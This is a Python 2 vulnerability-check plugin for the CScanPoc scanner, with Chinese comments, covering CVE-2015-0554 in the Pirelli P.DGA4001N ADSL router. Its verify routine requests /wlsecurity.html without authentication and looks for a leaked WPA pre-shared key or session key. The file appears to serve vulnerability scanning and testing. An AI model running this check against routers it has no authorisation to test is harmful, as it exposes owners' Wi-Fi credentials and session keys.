# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Pirelli' # 平台漏洞编号，留空
    name = 'Pirelli ADSL2/2+ Wireless Router P.DGA4001N 信息泄漏漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-01-05'  # 漏洞公布时间
    desc = '''
        Pirelli路由漏洞', 'Pirelli信息泄漏漏洞', '/wlsecurity.html. Tested on firmware version PDG_TEF_SP_4.06L.6.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/35721/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'CVE-2015-0554'  # cve编号
    product = 'Pirelli'  # 漏洞应用名称
    product_version = 'ADSL2/2+'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c7d10a59-d878-4213-b1aa-76e0e910464d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            verify_url = "%s/wlsecurity.html" % self.target
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if "var wpaPskKey = '" in content or "var sessionKey" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
